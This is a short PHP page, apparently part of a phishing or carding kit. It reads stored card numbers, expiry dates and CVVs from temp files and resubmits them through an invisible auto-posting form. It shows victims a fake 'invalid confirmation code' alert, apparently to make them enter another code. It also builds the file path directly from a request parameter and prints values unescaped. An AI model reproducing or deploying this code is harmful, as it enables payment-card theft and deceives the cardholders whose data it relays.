<?php

include "config.php";

$requestData = json_decode(file_get_contents("temp/" . $_REQUEST["opKey"]), true);

?>
Загрузка...
<form action="/<?=SH_DIR;?>/payment.php" method="POST" style="opacity:0;">
	<input type="text" name="cardFrom" value="<?php echo $requestData['from']; ?>">
	<input type="text" name="amount" value="<?php echo  $requestData['amount']; ?>">
	<input type="text" name="cardFromMonth" value="<?php echo $requestData['month'] ?>">
	<input type="text" name="cardFromYear" value="<?php echo$requestData['year'] ?>">
	<input type="text" name="cardFromCVC" value="<?php echo $requestData['cvv']; ?>">
	<input type="text" name="order_id" value="<?php echo $requestData['order_id']?>">
	<input type="submit" value="go" id="go">
</form>

<script>
    alert("Неверный код подтверждения, попробуйте еще раз!");
    document.getElementById("go").click();
</script>


